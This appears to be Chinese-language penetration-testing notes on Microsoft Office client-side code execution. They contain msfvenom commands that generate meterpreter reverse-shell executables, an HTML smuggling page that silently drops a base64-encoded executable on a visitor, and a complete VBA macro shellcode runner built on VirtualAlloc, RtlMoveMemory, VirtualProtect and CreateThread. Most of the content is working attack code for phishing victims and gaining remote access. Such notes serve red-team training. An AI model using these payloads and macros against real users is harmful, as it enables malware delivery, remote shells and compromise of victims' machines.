# Microsoft Office Client Side Code Executtion
## Staged vs Non-staged Payloads
一般來說平常使用相關 Payload 框架，都會搭配可以使用弱點，也就是說弱點是拿來突破防禦機制，Payload可以說是維持存取的一種手段，維持存取的類型Payload分為
### 以下meterpreter為例:
#### Non-staged Payload (無階段性)
直接在記憶體中呼叫 執行完整的Payload
通常送過去的Payload 大小較大
Ex: windows/meterpreter_reverse_tcp
##### 產生一個 exe
```
msfvenom -p windows/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=x -f exe -o non-staged.exe
```
#### Staged Payload (有階段性)
只送一小段 Payload 做接應
較穩定，且有其他功能
Ex: windows/meterpreter/reverse_tcp
##### 產生一個 exe
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f exe -o staged.exe
```
## HTML Smuggling 
想要在受害端機器上下載並執行相關的惡意程式，攻擊者會經常使用更謹慎的投放的方式。攻擊者可能將鏈接嵌入到電子郵件，當受害者閱讀電子郵件並存取網頁時，網頁自動下載惡意程式，這種行為就稱為HTML Smuggling
### Example
```
<html><body><script>	
function base64ToArrayBuffer(base64) { var binary_string = window.atob(base64); var len = binary_string.length; var bytes = new Uint8Array( len ); for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); } return bytes.buffer;}
var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAA... (產生的base64 )
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'staged.exe'; var a = document.createElement('a');
document.body.appendChild(a); a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url; a.download = fileName; a.click();
window.URL.revokeObjectURL(url);
</script></body></html>
```
## Executing Shellcode in Word
### Calling Win32 APIs from VBA
- C language
`BOOL GetUserNameA(LPSTR lpBuffer,LPDWORD pcbBuffer );`
- VBA Invoke
`Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long`
##### https://www.pinvoke.net/default.aspx/advapi32.getusername
##### EXAMPLE
```
Sub MyMacro()
Dim res As Long
Dim MyBuff As String * 256
Dim MySize As Long
Dim strlen As Long
MySize = 256
res = GetUserName(MyBuff, MySize)
strlen = InStr(1, MyBuff, vbNullChar) - 1
MsgBox Left$(MyBuff, strlen)
End Sub
```
### VBA Shellcode Runner
#### Setting Memory Page Parameter
```
Public Enum protectFlags
PAGE_NOACCESS = &H1
PAGE_READONLY = &H2
PAGE_READWRITE = &H4
PAGE_WRITECOPY = &H8
PAGE_EXECUTE = &H10
PAGE_EXECUTE_READ = &H20
PAGE_EXECUTE_READWRITE = &H40
PAGE_EXECUTE_WRITECOPY = &H80
PAGE_GUARD = &H100
PAGE_NOCACHE = &H200
PAGE_WRITECOMBINE = &H400
End Enum
```
#### VirtualAlloc
- C language
`LPVOID VirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );`
-  VBA Invoke
`Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr`
#### RtlMoveMemory
-  C language
`VOID RtlMoveMemory(VOID UNALIGNED *Destination,VOID UNALIGNED *Source,SIZE_T Length);`
-  VBA Invoke
`Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr`
#### VirtualProtect
-  C language
`BOOL VirtualProtect(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);`
-  VBA Invoke
`Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As LongPtr, lpflOldProtect As LongPtr) As LongPtr`
#### CreateThread
-  C language
`HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);`
-  VBA Invoke
`Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr`
#### VBA EXMAPLE CODE
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal memAddress As LongPtr, ByVal lengthInBytes As LongPtr, ByVal newProtect As protectFlags, ByRef outOldProtect As protectFlags) As Long
Public Enum protectFlags
    PAGE_NOACCESS = &H1
    PAGE_READONLY = &H2
    PAGE_READWRITE = &H4
    PAGE_WRITECOPY = &H8
    PAGE_EXECUTE = &H10
    PAGE_EXECUTE_READ = &H20
    PAGE_EXECUTE_READWRITE = &H40
    PAGE_EXECUTE_WRITECOPY = &H80
    PAGE_GUARD = &H100
    PAGE_NOCACHE = &H200
    PAGE_WRITECOMBINE = &H400
End Enum

Sub MyMacro()
Dim buf As Variant
Dim addr As LongPtr
Dim counter As Long
Dim data As Long
Dim res As Long

Dim originalProtection As protectFlags
Dim vpresult As Long


buf = Array(.......)

addr = VirtualAlloc(0, UBound(buf), &H3000, PAGE_READWRITE)

For counter = LBound(buf) To UBound(buf)
data = buf(counter)
res = RtlMoveMemory(addr + counter, data, 1)
Next counter

vpresult = VirtualProtect(addr, 3, PAGE_EXECUTE_READ, originalProtection)
res = CreateThread(0, 0, addr, 0, 0, 0)

End Sub
```
